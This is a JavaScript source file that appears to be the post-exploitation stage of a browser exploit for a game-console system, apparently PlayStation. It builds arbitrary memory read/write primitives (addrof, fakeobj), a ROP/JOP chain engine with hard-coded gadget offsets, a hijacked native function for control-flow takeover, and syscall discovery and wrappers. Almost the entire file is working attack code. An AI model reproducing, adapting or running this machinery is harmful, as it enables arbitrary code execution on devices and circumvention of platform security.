class BigInt {
  /**
   * @param  {[number, number]|number|string|BigInt|ArrayLike<number>}
   */
  constructor () {
    var lo = 0
    var hi = 0

    switch (arguments.length) {
      case 0:
        break
      case 1:
        var value = arguments[0]
        switch (typeof value) {
          case 'boolean':
            lo = value ? 1 : 0
            break
          case 'number':
            if (isNaN(value)) {
              throw new TypeError(`Number ${value} is NaN`)
            }

            if (Number.isInteger(value)) {
              if (!Number.isSafeInteger(value)) {
                throw new RangeError(`Integer ${value} outside safe 53-bit range`)
              }

              lo = value >>> 0
              hi = Math.floor(value / 0x100000000) >>> 0
            } else {
              BigInt.View.setFloat64(0, value, true)
              
              lo = BigInt.View.getUint32(0, true)
              hi = BigInt.View.getUint32(4, true)
            }

            break
          case 'string':
            if (value.startsWith('0x')) {
              value = value.slice(2)
            }

            if (value.length > 16) {
              throw new RangeError(`String ${value} is out of range !!`)
            }

            while (value.length < 16) {
              value = '0' + value
            }

            for (var i = 0; i < 8; i++) {
              var start = value.length - 2 * (i + 1)
              var end = value.length - 2 * i
              var b = value.slice(start, end)
              BigInt.View.setUint8(i, parseInt(b, 16))
            }

            lo = BigInt.View.getUint32(0, true)
            hi = BigInt.View.getUint32(4, true)

            break
          default:
            if (value instanceof BigInt) {
              lo = value.lo
              hi = value.hi
              break
            }

            throw new TypeError(`Unsupported value ${value} !!`)
        }
        break
      case 2:
        hi = arguments[0] >>> 0
        lo = arguments[1] >>> 0

        if (!Number.isFinite(hi)) {
          throw new RangeError(`hi value ${hi} is not an integer !!`)
        }

        if (!Number.isFinite(lo)) {
          throw new RangeError(`lo value ${lo} is not an integer !!`)
        }
        break
      default:
        throw new TypeError('Unsupported input !!')
    }

    this.lo = lo
    this.hi = hi
  }

  valueOf () {
    if (this.hi <= 0x1FFFFF) {
      return this.hi * 0x100000000 + this.lo
    }

    BigInt.View.setUint32(0, this.lo, true)
    BigInt.View.setUint32(4, this.hi, true)

    var f = BigInt.View.getFloat64(0, true)
    if (!isNaN(f)) {
      return f
    }

    throw new RangeError(`Unable to convert ${this} to primitive`)
  }

  toString () {
    BigInt.View.setUint32(0, this.lo, true)
    BigInt.View.setUint32(4, this.hi, true)

    var value = '0x'
    for (var i = 7; i >= 0; i--) {
      var c = BigInt.View.getUint8(i).toString(16).toUpperCase()
      value += c.length === 1 ? '0' + c : c
    }

    return value
  }

  getBit (idx) {
    if (idx < 0 || idx > 63) {
      throw new RangeError(`Bit ${idx} is out of range !!`)
    }

    return (idx < 32 ? (this.lo >>> idx) : (this.hi >>> (idx - 32))) & 1
  }

  setBit (idx, value) {
    if (idx < 0 || idx > 63) {
      throw new RangeError(`Bit ${idx} is out of range !!`)
    }

    if (idx < 32) { 
      this.lo = (value ? (this.lo | 1 << idx) : (this.lo & ~(1 << idx))) >>> 0
    } else {
      this.hi = (value ? (this.hi | 1 << (idx - 32)) : (this.hi & ~(1 << (idx - 32)))) >>> 0 
    }
  }

  endian () {
    var lo = this.lo
    var hi = this.hi

    this.lo = utils.swap32(hi)
    this.hi = utils.swap32(lo)
  }

  d () {
    var hi_word = this.hi >>> 16
    if (hi_word === 0xFFFF || hi_word === 0xFFFE) {
      throw new RangeError('Integer value cannot be represented by a double')
    }

    BigInt.View.setUint32(0, this.lo, true)
    BigInt.View.setUint32(4, this.hi, true)

    return BigInt.View.getFloat64(0, true)
  }

  jsv () {
    var hi_word = this.hi >>> 16
    if (hi_word === 0x0000 || hi_word === 0xFFFF) {
      throw new RangeError('Integer value cannot be represented by a JSValue')
    }

    return this.sub(new BigInt(0x10000, 0)).d()
  }

  cmp (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    if (this.hi > value.hi) {
      return 1
    }

    if (this.hi < value.hi) {
      return -1
    }

    if (this.lo > value.lo) {
      return 1
    }

    if (this.lo < value.lo) {
      return -1
    }

    return 0
  }

  eq (value) {
    value = value instanceof BigInt ? value : new BigInt(value)
    
    return this.hi === value.hi && this.lo === value.lo
  }

  neq (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    return this.hi !== value.hi || this.lo !== value.lo
  }

  gt (value) {
    return this.cmp(value) > 0
  }

  gte (value) {
    return this.cmp(value) >= 0
  }

  lt (value) {
    return this.cmp(value) < 0
  }

  lte (value) {
    return this.cmp(value) <= 0
  }

  add (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    var lo = this.lo + value.lo
    var c = lo > 0xFFFFFFFF ? 1 : 0
    var hi = this.hi + value.hi + c

    if (hi > 0xFFFFFFFF) {
      throw new RangeError(`add overflowed !!`)
    }

    return new BigInt(hi, lo)
  }

  sub (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    if (this.lt(value)) {
      throw new RangeError('sub underflowed !!')
    }

    var b = this.lo < value.lo ? 1 : 0
    var hi = this.hi - value.hi - b
    var lo = this.lo - value.lo

    return new BigInt(hi, lo)
  }

  mul (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    var m00 = Math.imul(this.lo, value.lo)
    var m01 = Math.imul(this.lo, value.hi)
    var m10 = Math.imul(this.hi, value.lo)
    var m11 = Math.imul(this.hi, value.hi)

    var d = m01 + m10

    var lo = m00 + (d << 32)
    var c = lo > 0xFFFFFFFF ? 1 : 0
    var hi = m11 + (d >>> 32) + c

    if (hi > 0xFFFFFFFF) {
      throw new Error('mul overflowed !!')
    }

    return new BigInt(hi, lo)
  }

  divmod (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    if (value === 0) {
      throw new Error('Division by zero')
    }

    var q = new BigInt()
    var r = new BigInt()

    for (var i = 63; i >= 0; i--) {
      r = r.shl(1)

      if (this.getBit(i)) {
        r.setBit(0, true)
      }

      if (r.gte(value)) {
        r = r.sub(value)
        q.setBit(i, true)
      }
    }

    return { q, r }
  }

  div (value) {
    return this.divmod(value).q
  }

  mod (value) {
    return this.divmod(value).r
  }

  xor (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    var lo = (this.lo ^ value.lo) >>> 0
    var hi = (this.hi ^ value.hi) >>> 0

    return new BigInt(hi, lo)
  }

  and (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    var lo = (this.lo & value.lo) >>> 0
    var hi = (this.hi & value.hi) >>> 0

    return new BigInt(hi, lo)
  }

  or (value) {
    value = value instanceof BigInt ? value : new BigInt(value)

    var lo = (this.lo | value.lo) >>> 0
    var hi = (this.hi | value.hi) >>> 0

    return new BigInt(hi, lo)
  }

  not () {
    var lo = ~this.lo >>> 0
    var hi = ~this.hi >>> 0

    return new BigInt(hi, lo)
  }

  shl (count) {
    if (count < 0 || count > 63) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    if (count === 0) {
      return new BigInt(this)
    }

    var lo = count < 32 ? (this.lo << count) >>> 0 : 0
    var hi = count < 32 ? ((this.hi << count) | (this.lo >>> (32 - count))) >>> 0 : (this.lo << (count - 32)) >>> 0

    return new BigInt(hi, lo)
  }

  shr (count) {
    if (count < 0 || count > 63) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    if (count === 0) {
      return new BigInt(this)
    }

    var lo = count < 32 ? ((this.lo >>> count) | (this.hi << (32 - count))) >>> 0 : this.hi >>> (count - 32)
    var hi = count < 32 ? this.hi >>> count : 0

    return new BigInt(hi, lo)
  }
}

BigInt.View = new DataView(new ArrayBuffer(8))

DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
  littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian

  var lo = this.getUint32(byteOffset, true)
  var hi = this.getUint32(byteOffset + 4, true)

  return new BigInt(hi, lo)
}

DataView.prototype.setBigInt = function (byteOffset, value, littleEndian) {
  value = (value instanceof BigInt) ? value : new BigInt(value)
  littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian

  this.setUint32(byteOffset, value.lo, littleEndian)
  this.setUint32(byteOffset + 4, value.hi, littleEndian)
}

var mem = {
  view: function (addr) {
    master[4] = addr.lo
    master[5] = addr.hi
    return slave
  },
  addrof: function (obj) {
    leak_obj.obj = obj
    return this.view(leak_obj_addr).getBigInt(0x10, true)
  },
  fakeobj: function (addr) {
    this.view(leak_obj_addr).setBigInt(0x10, addr, true)
    return leak_obj.obj
  },
  copy: function (dst, src, sz) {
    var src_buf = new Uint8Array(sz)
    var dst_buf = new Uint8Array(sz)

    utils.set_backing(src_buf, src)
    utils.set_backing(dst_buf, dst)

    dst_buf.set(src_buf)
  },
  malloc: function (count) {
    var buf = new Uint8Array(count)
    return utils.get_backing(buf)
  }
}

var utils = {
  base_addr: function (func_addr) {
    var module_info_addr = mem.malloc(struct.ModuleInfoForUnwind.sizeof)

    var module_info = new struct.ModuleInfoForUnwind(module_info_addr)

    module_info.st_size = 0x130

    if (!fn.sceKernelGetModuleInfoForUnwind(func_addr, 1, module_info.addr).eq(0)) {
      throw new Error(`Unable to get ${func_addr} base addr`)
    }

    var base_addr = module_info.seg0_addr

    return base_addr
  },
  notify: function (msg) {
    var notify_addr = mem.malloc(struct.NotificationRequest.sizeof)

    var notify = new struct.NotificationRequest(notify_addr)

    for (var i = 0; i < msg.length; i++) {
      notify.message[i] = msg.charCodeAt(i) & 0xFF
    }

    notify.message[msg.length] = 0

    var fd = fn.open('/dev/notification0', 1, 0)
    if (fd.lt(0)) {
      throw new Error('Unable to open /dev/notification0 !!')
    }

    fn.write(fd, notify.addr, struct.NotificationRequest.sizeof)
    fn.close(fd)
  },
  str: function (addr) {
    var chars = []

    var view = mem.view(addr)
    var term = false
    var offset = 0
    while (!term) {
      var c = view.getUint8(offset)
      if (c === 0) {
        term = true
        break
      }

      chars.push(c)

      offset++
    }

    return String.fromCharCode(...chars)
  },
  cstr: function (str) {
    var bytes = new Uint8Array(str.length + 1)

    for (var i = 0; i < str.length; i++) {
      bytes[i] = str.charCodeAt(i) & 0xFF
    }

    bytes[str.length] = 0

    return this.get_backing(bytes)
  },
  get_backing: function(view) {
    return mem.view(mem.addrof(view)).getBigInt(0x10, true)
  },
  set_backing: function(view, addr) {
    return mem.view(mem.addrof(view)).setBigInt(0x10, addr, true)
  },
  swap32: function(value) {
    return ((value & 0xff) << 24) | ((value & 0xff00) << 8) | ((value >>> 8) & 0xff00) | ((value >>> 24) & 0xff)
  }
}

var fn = {
  register: function (input, name, ret) {
    if (name in this) {
      throw new Error(`${name} already registered in fn !!`)
    }

    var id
    var addr
    if (input instanceof BigInt) {
      addr = input
    } else if (typeof input === 'number') {
      if (!syscalls.map.has(input)) {
        throw new Error(`Syscall id ${input} not found !!`)
      }

      id = new BigInt(input)
      addr = syscalls.map.get(input)
    }

    var f = this.wrapper.bind({id: id, addr: addr, ret: ret })

    f.addr = addr

    this[name] = f
  },
  unregister (name) {
    if (!(name in this)) {
      log(`${name} not registered in fn !!`)
      return false
    }

    delete this[name]

    return true
  },
  // not intended to be called directly
  wrapper: function () {
    if (arguments.length > 6) {
      throw new Error('More than 6 arguments is not supported !!')
    }

    var insts = []

    var regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]

    insts.push(gadgets.POP_RAX_RET)
    insts.push(this.id || 0)

    for (var i = 0; i < arguments.length; i++) {
      var reg = regs[i]
      var value = arguments[i]

      insts.push(reg)

      switch (typeof value) {
        case 'boolean':
        case 'number':
          value = new BigInt(value)
          break
        case 'string':
          value = utils.cstr(value)
          break
        default:
          if (!(value instanceof BigInt)) {
            throw new Error(`Invalid value at arg ${i}`)
          }
          break
      }

      insts.push(value)
    }

    insts.push(this.addr)

    var store_size = this.ret ? 0x10 : 8
    var store_addr = mem.malloc(store_size)

    if (this.ret) {
      rop.store(insts, store_addr, 1)
    }

    rop.execute(insts, store_addr, store_size)

    var result
    if (this.ret) {
      result = mem.view(store_addr).getBigInt(8, true)

      if (this.id) {
        if (result.eq(-1)) {
          var errno_addr = this._error()
          var errno = mem.view(errno_addr).getUint32(0, true)
          var str = this.strerror(errno)

          throw new Error(`${name} returned errno ${errno}: ${str}`)
        }
      }

      switch(this.ret) {
          case 'bigint':
            break
          case 'boolean':
            result = result.eq(1)
            break
          case 'string':
            result = utils.str(result)
            break
          default:
            throw new Error(`Unsupported return type ${this.ret}`)
        }
    }

    return result
  }
}

var gadgets = {
  init: function (base) {
    this.RET = base.add(0x4C)
    this.POP_R10_RET = base.add(0x19E297C)
    this.POP_R12_RET = base.add(0x3F3231)
    this.POP_R14_RET = base.add(0x15BE0A)
    this.POP_R15_RET = base.add(0x93CD7)
    this.POP_R8_RET = base.add(0x19BFF1)
    this.POP_R9_JO_RET = base.add(0x72277C)
    this.POP_RAX_RET = base.add(0x54094)
    this.POP_RBP_RET = base.add(0xC7)
    this.POP_RBX_RET = base.add(0x9D314)
    this.POP_RCX_RET = base.add(0x2C3DF3)
    this.POP_RDI_RET = base.add(0x93CD8)
    this.POP_RDX_RET = base.add(0x3A3DA2)
    this.POP_RSI_RET = base.add(0xCFEFE)
    this.POP_RSP_RET = base.add(0xC89EE)
    this.LEAVE_RET = base.add(0x50C33)
    this.MOV_RAX_QWORD_PTR_RDI_RET = base.add(0x36073)
    this.MOV_QWORD_PTR_RDI_RAX_RET = base.add(0x27FD0) 
    this.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40 = base.add(0x46E8F0)
    this.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18 = base.add(0x3F6F70)
    this.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10 = base.add(0x18B3B5)
    this.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22 = base.add(0x1E25AA1)
    this.PUSH_RBP_POP_RCX_RET = base.add(0x1737EEE)
    this.MOV_RAX_RCX_RET = base.add(0x41015)
    this.PUSH_RAX_POP_RBP_RET = base.add(0x4E82B9)
  }
}

var rop = {
  idx: 0,
  base: 0x2500,
  jop_stack_store: undefined,
  jop_stack_addr: undefined,
  stack_addr: undefined,
  fake: undefined,
  init: function (addr) {
    log('Initiate ROP...')

    gadgets.init(addr)

    this.jop_stack_store = mem.malloc(8)
    this.jop_stack_addr = mem.malloc(0x6A)
    this.stack_addr = mem.malloc(this.base * 2)

    var jop_stack_base_addr = this.jop_stack_addr.add(0x22)

    mem.view(this.jop_stack_addr).setBigInt(0, gadgets.POP_RSP_RET, true)
    mem.view(jop_stack_base_addr).setBigInt(0, this.stack_addr.add(this.base), true)
    mem.view(jop_stack_base_addr).setBigInt(0x10, gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22, true)
    mem.view(jop_stack_base_addr).setBigInt(0x18, gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true)
    mem.view(jop_stack_base_addr).setBigInt(0x40, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18, true)

    mem.view(this.jop_stack_store).setBigInt(0, jop_stack_base_addr, true)

    this.fake = this.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
    this.reset()

    log('Achieved ROP !!')
  },
  reset: function () {
    this.idx = this.base
  },
  push: function (value) {
    if (this.idx > this.base * 2) {
      throw new Error('Stack full !!')
    }

    mem.view(this.stack_addr).setBigInt(this.idx, value, true)
    this.idx += 8
  },
  execute: function (insts, store_addr, store_size) {
    if (store_size % 8 !== 0) {
      throw new Error('Invalid store, not aligned by 8 bytes')
    }

    if (store_size < 8) {
      throw new Error('Invalid store, minimal size is 8 to store RSP')
    }

    var header = []

    header.push(gadgets.PUSH_RBP_POP_RCX_RET)
    header.push(gadgets.MOV_RAX_RCX_RET)
    this.store(header, store_addr, 0)

    var footer = []

    this.load(footer, store_addr, 0)
    footer.push(gadgets.PUSH_RAX_POP_RBP_RET)
    footer.push(gadgets.POP_RAX_RET)
    footer.push(0)
    footer.push(gadgets.LEAVE_RET)

    insts = header.concat(insts).concat(footer)

    for (var inst of insts) {
      this.push(inst)
    }

    this.fake(0, 0, 0, mem.fakeobj(this.jop_stack_store))

    this.reset()
  },
  fake_builtin: function (addr) {
    function fake () {}

    var fake_native_executable = mem.malloc(0x60)
    debug(`fake_native_executable: ${fake_native_executable}`)

    mem.copy(fake_native_executable, native_executable, 0x60)
    mem.view(fake_native_executable).setBigInt(0x40, addr, true)

    var fake_addr = mem.addrof(fake)
    debug(`addrof(fake): ${fake_addr}`)

    mem.view(fake_addr).setBigInt(0x10, scope, true)
    mem.view(fake_addr).setBigInt(0x18, fake_native_executable, true)

    fake.executable = fake_native_executable

    return fake
  },
  store (insts, addr, index) {
    insts.push(gadgets.POP_RDI_RET)
    insts.push(addr.add(index * 8))
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
  },
  load (insts, addr, index) {
    insts.push(gadgets.POP_RDI_RET)
    insts.push(addr.add(index * 8))
    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET)
  }
}

var struct = {
  register: function (name, fields) {
    if (!Array.isArray(fields) || fields.length === 0) {
      throw new Error(`Empty fields array !!`)
    }

    if (name in this) {
      throw new Error(`${name} already registered in struct !!`)
    }

    var [sizeof, infos] = this.parse(fields)

    var cls = class {                    
      constructor(addr) {
        this.addr = addr
      }
    }

    this[name] = cls

    cls.tname = name
    cls.sizeof = sizeof
    cls.fields = fields

    for (var info of infos) {
      this.define_property(cls, info)
    }
  },
  unregister: function (name) {
    if (!(name in this)) {
        throw new Error(`${name} not registered in struct !!`)
    }

    delete this[name]

    return true
  },
  parse: function (fields) {
    var infos = []
    var offset = 0
    var struct_alignment = 1
    for (var i = 0; i < fields.length; i++) {
      var field = fields[i]

      var size = 0
      var alignment = 0
      var pointer = false
      var type = field.type

      var [, name, count] = field.name.match(/^(.+?)(?:\[(\d+)\])?$/)

      if (type.includes('*')) {
          size = 8
          alignment = 8
          pointer = true
      } else if (type in this) {
        size = this[type].sizeof
      } else {
        var bits = type.replace(/\D/g, '')
        if (bits % 8 !== 0) {
          throw new Error(`Invalid primitive type ${type}`)
        }

        size = bits / 8
        alignment = size
      }

      if (size === 0) {
          throw new Error(`Invalid size for ${field.name} !!`)
      }

      count = count ? parseInt(count) : 1

      if (offset % alignment !== 0) {
          offset += alignment - (offset % alignment)
      }

      infos.push({type: type, name: name, offset: offset, size: size, count: count, pointer: pointer})

      offset += size * count

      if (alignment > struct_alignment) {
          struct_alignment = alignment
      }
    }

    if (offset % struct_alignment !== 0) {
      offset += struct_alignment - (offset % struct_alignment)
    }

    return [offset, infos]
  },
  define_property: function (cls, info) {
    Object.defineProperty(cls.prototype, info.name, {
      get: function () {
        if (info.count > 1) {
          var addr = this.addr.add(info.offset)
          if (info.pointer) {
            addr = mem.view(addr).getBigInt(0, true)
          }

          var arr
          switch(info.type) {
            case 'Int8': 
              arr = new Int8Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint8':
              arr = new Uint8Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int16': 
              arr = new Int16Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint16':
              arr = new Uint16Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int32':
              arr = new Int32Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint32':
              arr = new Uint32Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int64':
              arr = new Uint32Array(info.count * 2)
              utils.set_backing(arr, addr)
              break
            case 'Uint64':
              arr = new Uint32Array(info.count * 2)
              utils.set_backing(arr, addr)
              break
            default:
              if (info.type in this) {
                for (var i = 0; i < info.count; i++) {
                  arr[i] = new this[info.name](addr.add(i * info.size))
                }
              }

              throw new Error(`Invalid type ${info.type}`)
          }

          return arr
        } else {
          var value = mem.view(this.addr).getBigInt(info.offset, true)
          switch(info.type) {
            case 'Int8': return value.i8[0]
            case 'Uint8': return value.u8[0]
            case 'Int16': return value.i16[0]
            case 'Uint16': return value.u16[0]
            case 'Int32': return value.i32[0]
            case 'Uint32': return value.u32[0]
            case 'Int64': return value
            case 'Uint64': return value
            default:
              if (info.pointer) {
                return value
              }
                
              throw new Error(`Invalid type ${info.type}`)
          }
        }
      },
      set: function (value) {
        if (info.count > 1) {
          if (!value.buffer) {
            throw new Error('value is not a typed array')
          }

          if (value.buffer.byteLength !== info.size * info.count) {
            throw new Error(`expected ${info.size * info.count} bytes got ${value.buffer.byteLength}`)
          }
              
          var addr = this.addr.add(info.offset)
          if (info.type.includes('*')) {
            addr = mem.view(addr).getBigInt(0, true)
          }

          var buf = new Uint8Array(info.size * info.count)
          utils.set_backing(buf, addr)

          buf.set(value)
        } else {
          var temp = mem.view(this.addr).getBigInt(info.offset, true)
          switch(info.type) {
            case 'Int8': 
              temp.i8[0] = value
              break
            case 'Uint8':
              temp.u8[0] = value
              break
            case 'Int16':
              temp.i16[0] = value
              break
            case 'Uint16':
              temp.u16[0] = value
              break
            case 'Int32':
              temp.i32[0] = value
              break
            case 'Uint32':
              temp.u32[0] = value
              break
            case 'Int64':
              temp = value
              break
            case 'Uint64':
              temp = value
              break
            default:
              if (info.type.includes('*')) {
                temp = value
                break
              }

              throw new Error(`Invalid type ${info.type}`)
          }

          mem.view(this.addr).setBigInt(info.offset, temp, true)
        }
      }
    })
  }
}

var syscalls = {
  map: new Map(),
  pattern: [0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xCA, 0x0F, 0x05],
  init: function (addr) {
    var offset = 0
    var count = 0x40000
    
    var view = mem.view(addr)
    
    var start_offset = 0
    var pattern_idx = 0
    while (offset < count) {
      var b = view.getUint8(offset)
      var c = this.pattern[pattern_idx]
      if (b === c || (c === 0xFF && b < c)) {
        if (pattern_idx === 0) {
          start_offset = offset
        } else if (pattern_idx === this.pattern.length - 1) {
          var id = view.getInt32(start_offset + 3, true)

          this.map.set(id, addr.add(start_offset))

          pattern_idx = 0
          continue
        }

        pattern_idx++
      } else {
        pattern_idx = 0
      }

      offset++
    }
  },
  clear: function () {
    syscalls.map.clear()
  }
}